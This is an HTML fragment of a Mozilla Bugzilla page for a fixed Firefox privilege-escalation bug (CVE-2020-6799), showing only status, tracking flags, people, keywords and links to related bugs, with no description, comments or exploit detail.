    <div class="field edit-show" id="field-status-edit" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-edit-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-edit"><div class="field inline" id="field-bug_status"
>


  
    <div class="value">
        <span id="field-value-bug_status">
            RESOLVED

        </span>
    </div>

  
</div><div class="field indent inline" id="field-resolution"
>


  
    <div class="value">
        <span id="field-value-resolution">
            FIXED

        </span>
    </div>

  
</div>
  <div id="status-action-buttons">
      <div id="assigned-container" style="display:none">
        <button type="button" class="secondary" id="mark-as-assigned-btn">
          Mark as Assigned
        </button>
      </div>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-target_milestone"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone" id="target_milestone-help-link" class="help">Milestone:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-target_milestone">
            Firefox 74

        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_iteration" style="display:none"
>
    <div class="name">Iteration:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_iteration">
            ---

        </span>
    </div>

  
</div>


      <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Project Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <td class="tracking-flag-name">a11y-review</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_a11y_review_project_flag-dirty">
  <select id="cf_a11y_review_project_flag" name="cf_a11y_review_project_flag">
        <option value="---"
          id="v4876_cf_a11y_review_project_flag" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Root Cause</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_root_cause-dirty">
  <select id="cf_root_cause" name="cf_root_cause">
        <option value="---"
          id="v4701_cf_root_cause" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Webcompat Priority</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_webcompat_priority-dirty">
  <select id="cf_webcompat_priority" name="cf_webcompat_priority">
        <option value="---"
          id="v4274_cf_webcompat_priority" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">user-doc-firefox</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_sumo-dirty">
  <select id="cf_tracking_firefox_sumo" name="cf_tracking_firefox_sumo">
        <option value="---"
          id="v4660_cf_tracking_firefox_sumo" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Fission Milestone</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_fission_milestone-dirty">
  <select id="cf_fission_milestone" name="cf_fission_milestone">
        <option value="---"
          id="v4222_cf_fission_milestone" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Install Update Workflow</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_install_update_workflow-dirty">
  <select id="cf_install_update_workflow" name="cf_install_update_workflow">
        <option value="---"
          id="v4664_cf_install_update_workflow" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

      <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Tracking Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-hide">
    <table class="layout-table tracking-flags">
        <tr>
          <th></th>
          <th>Tracking</th>
          <th>Status</th>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr68</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=equals&amp;v1=73%2B">73+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox72</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox73</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox73&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox73&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox74</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox74&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox74&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
    </table>
  </div>


<div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <th></th>
        <th>Tracking</th>
        <th>Status</th>
      </tr>
      <tr>
        <td class="tracking-flag-name">relnote-firefox</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_relnote-dirty">
  <select id="cf_tracking_firefox_relnote" name="cf_tracking_firefox_relnote">
        <option value="---"
          id="v539_cf_tracking_firefox_relnote" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr68</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr68-dirty">
  <select id="cf_tracking_firefox_esr68" name="cf_tracking_firefox_esr68">
        <option value="73+"
          id="v4484_cf_tracking_firefox_esr68" selected
        >73+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr68-dirty">
  <select id="cf_status_firefox_esr68" name="cf_status_firefox_esr68">
        <option value="fixed"
          id="v4412_cf_status_firefox_esr68" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr78-dirty">
  <select id="cf_tracking_firefox_esr78" name="cf_tracking_firefox_esr78">
        <option value="---"
          id="v4808_cf_tracking_firefox_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr78-dirty">
  <select id="cf_status_firefox_esr78" name="cf_status_firefox_esr78">
        <option value="---"
          id="v4813_cf_status_firefox_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr91-dirty">
  <select id="cf_tracking_firefox_esr91" name="cf_tracking_firefox_esr91">
        <option value="---"
          id="v5194_cf_tracking_firefox_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr91-dirty">
  <select id="cf_status_firefox_esr91" name="cf_status_firefox_esr91">
        <option value="---"
          id="v5199_cf_status_firefox_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox72</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox72-dirty">
  <select id="cf_status_firefox72" name="cf_status_firefox72">
        <option value="wontfix"
          id="v4506_cf_status_firefox72" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox73</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox73-dirty">
  <select id="cf_tracking_firefox73" name="cf_tracking_firefox73">
        <option value="+"
          id="v4540_cf_tracking_firefox73" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox73-dirty">
  <select id="cf_status_firefox73" name="cf_status_firefox73">
        <option value="fixed"
          id="v4548_cf_status_firefox73" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox74</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox74-dirty">
  <select id="cf_tracking_firefox74" name="cf_tracking_firefox74">
        <option value="+"
          id="v4565_cf_tracking_firefox74" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox74-dirty">
  <select id="cf_status_firefox74" name="cf_status_firefox74">
        <option value="fixed"
          id="v4573_cf_status_firefox74" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox93</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox93-dirty">
  <select id="cf_tracking_firefox93" name="cf_tracking_firefox93">
        <option value="---"
          id="v5266_cf_tracking_firefox93" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox93-dirty">
  <select id="cf_status_firefox93" name="cf_status_firefox93">
        <option value="---"
          id="v5271_cf_status_firefox93" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox94</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox94-dirty">
  <select id="cf_tracking_firefox94" name="cf_tracking_firefox94">
        <option value="---"
          id="v5284_cf_tracking_firefox94" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox94-dirty">
  <select id="cf_status_firefox94" name="cf_status_firefox94">
        <option value="---"
          id="v5289_cf_status_firefox94" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox95</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox95-dirty">
  <select id="cf_tracking_firefox95" name="cf_tracking_firefox95">
        <option value="---"
          id="v5311_cf_tracking_firefox95" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox95-dirty">
  <select id="cf_status_firefox95" name="cf_status_firefox95">
        <option value="---"
          id="v5316_cf_status_firefox95" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>

</div>
  </div>
</section>



<section class="module" id="module-people"
>
    <header id="module-people-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse People section"
           data-label-collapsed="Expand People section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-people-content"
             aria-expanded="false"
             aria-labeledby="module-people-title"
             aria-describedby="module-people-subtitle"></div>
        <h2 class="module-title" id="module-people-title">People</h2>
          <h3 class="module-subtitle" id="module-people-subtitle">
            (Reporter: jpg.inc.au, Assigned: mhowell)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-people-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-assigned_to"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to"><div class="vcard vcard_550257" ><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=550257" > <span class="fna">mhowell</span></a>
</div>
        </span>
    </div>

  
</div><div class="field edit-show" id="field-assigned_to" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-assignee" name="set_default_assignee" class="set-default"
          value="1" data-for="assigned_to">
        <label for="set-default-assignee">Reset Assignee to default</label>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-bug_mentors" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor" id="bug_mentors-help-link" class="help">Mentors:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_mentors">---
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-qa_contact" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact" id="qa_contact-help-link" class="help">QA Contact:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-qa_contact">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-qa-contact" name="set_default_qa_contact" class="set-default"
          value="1" data-for="qa_contact">
        <label for="set-default-qa-contact">Reset QA Contact to default</label>
      </div>
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-reporter"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter" id="reporter-help-link" class="help">Reporter:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-reporter">
            <div class="vcard vcard_600722" ><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=600722" > <span class="fna">jpg.inc.au</span></a>
</div>

        </span>
    </div>

  
</div>

    <div class="field" id="field-triage_owner"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner" id="triage_owner-help-link" class="help">Triage Owner:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-triage_owner">
            <div class="vcard vcard_692168" ><img src="https://secure.gravatar.com/avatar/d727fb8d9edb9b1a5b541d7621cb3124?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=692168" > <span class="fna">Amir</span></a>
</div>

        </span>
    </div>

  
</div>

    

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc" id="-help-link" class="help">CC:
        </a>
    </div>


  
    <div class=" container">


        <span aria-owns="cc-summary cc-latch">
          <span role="button" tabindex="0" id="cc-summary" data-count="13">13 people
          </span>
        </span>


        <div id="cc-list" style="display:none"></div>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-references"
>
    <header id="module-references-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse References section"
           data-label-collapsed="Expand References section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-references-content"
             aria-expanded="false"
             aria-labeledby="module-references-title"
             aria-describedby="module-references-subtitle"></div>
        <h2 class="module-title" id="module-references-title">References</h2>
      </div>
    </header>
  <div class="module-content" id="module-references-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug-list" id="field-dependson"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson" id="dependson-help-link" class="help">Depends on:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-dependson">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="enhancement"
              aria-label="enhancement" data-type="enhancement">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths"
   href="/show_bug.cgi?id=1531475">1531475</a>
      </div>

        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-blocked" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks" id="blocked-help-link" class="help">Blocks:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-blocked">
        ---
        </span>
    </div>

  
</div><div class="field" id="field-dependencytree"
>
    <div class="name">
    </div>


  
    <div class=" container">
        <span id="field-value-dependencytree">
        Dependency <a href="/showdependencytree.cgi?id=1606596&amp;hide_resolved=1">tree</a>
        / <a href="/showdependencygraph.cgi?id=1606596">graph</a>
        </span>
    </div>

  
</div>

    <div class="field bug-list" id="field-regresses"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses" id="regresses-help-link" class="help">Regressions:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regresses">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Firefox don't listed in context menu &quot;open with...&quot; with file type .jpg extension"
   href="/show_bug.cgi?id=1619122">1619122</a>
      </div>

        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-regressed_by" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by" id="regressed_by-help-link" class="help">Regressed by:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regressed_by">
        ---
        </span>
    </div>

  
</div>

    
</div><div class="fields-rhs">

    <div class="field edit-show" id="field-bug_file_loc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc" id="bug_file_loc-help-link" class="help">URL:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_file_loc"><div class="link">
    <a href="" target="_blank"
      rel="noreferrer" title=""
      class="bug-url" data-safe="0"></a>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-see_also"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also" id="see_also-help-link" class="help">See Also:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-see_also">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox"
   href="/show_bug.cgi?id=1530103">CVE-2019-9794</a>
      </div>
      <div class="bug-list">
        <span class="bug-type-label iconic" title="enhancement"
              aria-label="enhancement" data-type="enhancement">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths"
   href="/show_bug.cgi?id=1531475">1531475</a>
      </div>

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-details"
>
    <header id="module-details-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Details section"
           data-label-collapsed="Expand Details section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-details-content"
             aria-expanded="false"
             aria-labeledby="module-details-title"
             aria-describedby="module-details-subtitle"></div>
        <h2 class="module-title" id="module-details-title">Details</h2>
          <h3 class="module-subtitle" id="module-details-subtitle">
            (Keywords: csectype-priv-escalation, sec-moderate, Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+])
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-details-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-show" id="field-alias" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias" id="alias-help-link" class="help">Alias:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-alias">
            CVE-2020-6799

        </span>
    </div>

  
</div>

    <div class="field" id="field-keywords"
>
    <div class="name">
        <a href="/describekeywords.cgi" id="keywords-help-link" class="help">Keywords:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-keywords">
          <a href="/buglist.cgi?keywords=csectype-priv-escalation&amp;resolution=---">csectype-priv-escalation</a>, 
          <a href="/buglist.cgi?keywords=sec-moderate&amp;resolution=---">sec-moderate</a>
        </span>
    </div>

  
</div>

    <div class="field" id="field-status_whiteboard"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/Whiteboard" id="status_whiteboard-help-link" class="help">Whiteboard:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-status_whiteboard">[reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+]
        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_qa_whiteboard" style="display:none"
>
    <div class="name">QA Whiteboard:
    </div>


  
    <div class="value">
        <span id="field-value-cf_qa_whiteboard">
        ---
        </span>
    </div>

  
</div>

    

    <div class="field edit-show" id="field-cf_has_regression_range" style="display:none"
>
    <div class="name">Has Regression Range:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_regression_range">
            ---

        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_has_str" style="display:none"
>
    <div class="name">Has STR:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_str">
            ---

        </span>
    </div>

  
</div>

    <div class="field" id="field-votes"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes" id="votes-help-link" class="help">Votes:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-votes">0
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-bug_flags"
>
    <div class="name">Bug Flags:
    </div>


  
    <div class=" container">
        <span id="field-value-bug_flags"><div id="bug-flags" class="flags">
  <table class="layout-table">
          <tbody class="edit-hide"><tr>
    <td class="flag-setter"><div class="vcard vcard_1689" ><a class="email " href="/user_profile?user_id=1689" > <span class="fna">dveditz</span></a>
</div>
    </td>

    <td class="flag-name">
        <a href="#a2802280_1689"
            class="rel-time-title activity-ref"
            title="2 years ago"
        data-time="1577951683"
      >sec-bounty</a>
    </td>

    <td class="flag-value">+
    </td>

  </tr>
          </tbody>
          <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter"><div class="vcard vcard_1689" ><a class="email " href="/user_profile?user_id=1689" > <span class="fna">dveditz</span></a>
</div>
    </td>

    <td class="flag-name">
      <label title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug." for="flag-1939224">sec-bounty</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag-1939224-dirty">
      <select id="flag-1939224" name="flag-1939224"
        title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug."
        class="bug-flag">
            <option value="+" selected>+</option>
      </select>
    </td>


  </tr>
          </tbody>
          <tbody class="edit-hide"><tr>
    <td class="flag-setter"><div class="vcard vcard_458188" ><a class="email " href="/user_profile?user_id=458188" > <span class="fna">bogdan_maris</span></a>
</div>
    </td>

    <td class="flag-name">
        <a href="#a1322679_458188"
            class="rel-time-title activity-ref"
            title="2 years ago"
        data-time="1579274362"
      >qe-verify</a>
    </td>

    <td class="flag-value">-
    </td>

  </tr>
          </tbody>
          <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter"><div class="vcard vcard_458188" ><a class="email " href="/user_profile?user_id=458188" > <span class="fna">bogdan_maris</span></a>
</div>
    </td>

    <td class="flag-name">
      <label title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually" for="flag-1943315">qe-verify</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag-1943315-dirty">
      <select id="flag-1943315" name="flag-1943315"
        title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually"
          disabled
        class="bug-flag">
            <option value="-" selected>-</option>
      </select>
    </td>


  </tr>
          </tbody>
    <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?" for="flag_type-930">behind-pref</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-930-dirty">
      <select id="flag_type-930" name="flag_type-930"
        title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?"
        class="bug-flag">
          <option value="X"></option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="This bug must be fixed for Firefox Sync 1.7" for="flag_type-708">blocking-fx-sync1.7</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-708-dirty">
      <select id="flag_type-708" name="flag_type-708"
        title="This bug must be fixed for Firefox Sync 1.7"
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag tracking inclusion in the desktop Firefox product backlog." for="flag_type-846">firefox-backlog</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-846-dirty">
      <select id="flag_type-846" name="flag_type-846"
        title="Flag tracking inclusion in the desktop Firefox product backlog."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame." for="flag_type-913">sec-bounty-hof</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-913-dirty">
      <select id="flag_type-913" name="flag_type-913"
        title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-787">in-qa-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-787-dirty">
      <select id="flag_type-787" name="flag_type-787"
        title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>

      <td class="flag-requestee">
        <div id="requestee_type-787-container" style="display:none"><input
    name="requestee_type-787"
    value="" class="requestee bz_autocomplete_user"  id="requestee_type-787" 
  >
        </div>
      <td>

  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-37">in-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-37-dirty">
      <select id="flag_type-37" name="flag_type-37"
        title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr>
    </tbody>
  </table>
</div>
        </span>
    </div>

  
</div>
</div>

  
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-crash-data"
>
    <header id="module-crash-data-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Crash Data section"
           data-label-collapsed="Expand Crash Data section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-crash-data-content"
             aria-expanded="false"
             aria-labeledby="module-crash-data-title"
             aria-describedby="module-crash-data-subtitle"></div>
        <h2 class="module-title" id="module-crash-data-title">Crash Data</h2>
      </div>
    </header>
  <div class="module-content" id="module-crash-data-content" style="display:none"
  ><div class="field edit-show" id="field-cf_crash_signature" style="display:none"
>
    <div class="name">Signature:
    </div>


  
    <div class="value">
        <span id="field-value-cf_crash_signature">
        </span>
    </div>

  
</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-security"
>
    <header id="module-security-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Security section"
           data-label-collapsed="Expand Security section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-security-content"
             aria-expanded="false"
             aria-labeledby="module-security-title"
             aria-describedby="module-security-subtitle"></div>
        <h2 class="module-title" id="module-security-title">Security</h2>
          <h3 class="module-subtitle" id="module-security-subtitle">
            (public)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-security-content" style="display:none"
  ><div class="groups edit-hide">
    This bug is publicly visible.
</div>

<div class="groups edit-show" style="display:none">


</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-user-story" data-non-stick="1"
>
    <header id="module-user-story-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse User Story section"
           data-label-collapsed="Expand User Story section">
